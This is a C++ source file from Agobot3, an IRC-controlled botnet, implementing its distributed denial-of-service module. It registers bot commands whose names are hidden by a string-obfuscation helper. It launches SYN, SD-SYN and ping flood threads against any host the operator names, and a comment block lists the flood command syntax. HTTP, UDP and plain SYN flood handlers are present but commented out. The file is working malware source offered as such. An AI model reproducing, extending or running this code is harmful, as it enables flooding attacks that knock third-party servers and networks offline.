/*	Agobot3 - a modular IRC bot for Win32/Linux
	Copyright (C) 2003 Ago

	This program is free software; you can redistribute it and/or
	modify it under the terms of the GNU General Public License
	as published by the Free Software Foundation; either version 2
	of the License, or (at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program; if not, write to the Free Software
	Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA  02111-1307, USA. */

#include "main.h"
#include "ddos.h"
#include "mainctrl.h"
#include "sdsyn.h"
//#include "savaksyn.h"
#include "synflood.h"
//#include "httpflood.h"
#include "pingflood.h"
#include "udpflood.h"

void CDDOS::Init()
{	
	m_iNumThreads=0; 
	m_bDDOSing=false;
	g_cMainCtrl.m_cCommands.RegisterCommand(&m_cmdPing,		dp(4,4,15,19,79,16,9,14,7,0).CStr(),		this);
	g_cMainCtrl.m_cCommands.RegisterCommand(&m_cmdUDP,		dp(4,4,15,19,79,21,4,16,0).CStr(),			this);
	g_cMainCtrl.m_cCommands.RegisterCommand(&m_cmdSyn,		dp(4,4,15,19,79,19,25,14,0).CStr(),			this);
//	g_cMainCtrl.m_cCommands.RegisterCommand(&m_cmdHTTP,		dp(4,4,15,19,79,8,20,20,16,0).CStr(),		this);
	g_cMainCtrl.m_cCommands.RegisterCommand(&m_cmdStop,		dp(4,4,15,19,79,19,20,15,16,0).CStr(),		this);
	g_cMainCtrl.m_cCommands.RegisterCommand(&m_cmdSdSyn,	dp(4,4,15,19,79,19,4,19,25,14,0).CStr(),	this);

}

/*
	.ddos.synflood <host> <time> <delay> <port>
	 - port 0 = random port
	.ddos.sdsyn <host> <time> <delay> <port>
	 - port 0 = random port
	.ddos.udpflood [host] [number] [size] [delay] [port]
	 - port 0 = random port
	.ddos.spudpflood <host> <number> <size> <delay> <port>
	 - port 0 = random port
	.ddos.pingflood <host> <number> <size> <delay>
	.ddos.httpflood <url> <number> <referrer> <delay> <recursive>
	 - delay 0 = random delay (1-24h)
	 - recursive = get page resources
*/

bool CDDOS::HandleCommand(CMessage *pMsg)
{
/*
	if(!pMsg->sCmd.Compare(m_cmdHTTP.sName.Str()))
	{	
		CDDOSHTTPFlood *pTemp=new CDDOSHTTPFlood; 
		m_bDDOSing=true; pTemp->m_pDDOS=this;

		pTemp->m_sURL.Assign(pMsg->sChatString.Token(1, " ").CStr());
		pTemp->m_iNumber=atoi(pMsg->sChatString.Token(2, " ").CStr());
		pTemp->m_sReferrer.Assign(pMsg->sChatString.Token(3, " ").CStr());
		pTemp->m_iDelay=atoi(pMsg->sChatString.Token(4, " ").CStr());

		if(!pMsg->sChatString.Token(5, " ").CompareNoCase("true"))
			pTemp->m_bRecursive=true; 
		else pTemp->m_bRecursive=false;

		pTemp->m_sReplyTo.Assign(pMsg->sReplyTo); 
		pTemp->m_bSilent=pMsg->bSilent; 
		pTemp->m_bNotice=pMsg->bNotice;
		pTemp->Start(); 
	}
*/
/*	if(!pMsg->sCmd.Compare(m_cmdSyn.sName.Str()))
	{	CDDOSSynFlood *pTemp=new CDDOSSynFlood; m_bDDOSing=true; pTemp->m_pDDOS=this;
		pTemp->m_sHost.Assign(pMsg->sChatString.Token(1, " "));
		pTemp->m_iTime=atoi(pMsg->sChatString.Token(2, " ").CStr());
		pTemp->m_iDelay=atoi(pMsg->sChatString.Token(3, " ").CStr());
		pTemp->m_iPort=atoi(pMsg->sChatString.Token(4, " ").CStr());
		pTemp->m_sReplyTo.Assign(pMsg->sReplyTo); pTemp->m_bSilent=pMsg->bSilent; pTemp->m_bNotice=pMsg->bNotice;
		pTemp->Start(); }*/


		if(!pMsg->sCmd.Compare(m_cmdSdSyn.sName.Str()))
	{	CDDOSSDSyn *pTemp=new CDDOSSDSyn; m_bDDOSing=true; pTemp->m_pDDOS=this;
		pTemp->m_sHost.Assign(pMsg->sChatString.Token(1, " "));
		pTemp->m_iTime=atoi(pMsg->sChatString.Token(2, " ").CStr());
		pTemp->m_iDelay=atoi(pMsg->sChatString.Token(3, " ").CStr());
		pTemp->m_iPort=atoi(pMsg->sChatString.Token(4, " ").CStr());
		pTemp->m_sReplyTo.Assign(pMsg->sReplyTo); pTemp->m_bSilent=pMsg->bSilent; pTemp->m_bNotice=pMsg->bNotice;
		pTemp->Start(); }


		if(!pMsg->sCmd.Compare(m_cmdPing.sName.Str()))
	{	CDDOSPingFlood *pTemp=new CDDOSPingFlood; m_bDDOSing=true; pTemp->m_pDDOS=this;
	 	pTemp->m_sHost.Assign(pMsg->sChatString.Token(1, " "));
		pTemp->m_iNumber=atoi(pMsg->sChatString.Token(2, " ").CStr());
		pTemp->m_iSize=atoi(pMsg->sChatString.Token(3, " ").CStr());
		pTemp->m_iDelay=atoi(pMsg->sChatString.Token(4, " ").CStr());
		pTemp->m_sReplyTo.Assign(pMsg->sReplyTo); pTemp->m_bSilent=pMsg->bSilent; pTemp->m_bNotice=pMsg->bNotice;
		pTemp->Start(); }

	/*	if(!pMsg->sCmd.Compare(m_cmdUDP.sName.Str()))
	{	CDDOSUDPFlood *pTemp=new CDDOSUDPFlood; m_bDDOSing=true; pTemp->m_pDDOS=this;
		pTemp->m_sHost.Assign(pMsg->sChatString.Token(1, " "));
		pTemp->m_iNumber=atoi(pMsg->sChatString.Token(2, " ").CStr());
		pTemp->m_iSize=atoi(pMsg->sChatString.Token(3, " ").CStr());
		pTemp->m_iDelay=atoi(pMsg->sChatString.Token(4, " ").CStr());
		pTemp->m_iPort=atoi(pMsg->sChatString.Token(5, " ").CStr());
		pTemp->m_sReplyTo.Assign(pMsg->sReplyTo); pTemp->m_bSilent=pMsg->bSilent; pTemp->m_bNotice=pMsg->bNotice;
		pTemp->Start(); }*/

	if(!pMsg->sCmd.Compare(m_cmdStop.sName.Str())) m_bDDOSing=false;

	return true; }

void *CDDOSBase::Run()
{	if(!(g_cMainCtrl.m_cBot.ddos_maxthreads.iValue<m_pDDOS->m_iNumThreads))
		m_pDDOS->m_iNumThreads++; StartDDOS(); m_pDDOS->m_iNumThreads--;
	g_cMainCtrl.m_lCanJoin.push_back(this); return NULL; }
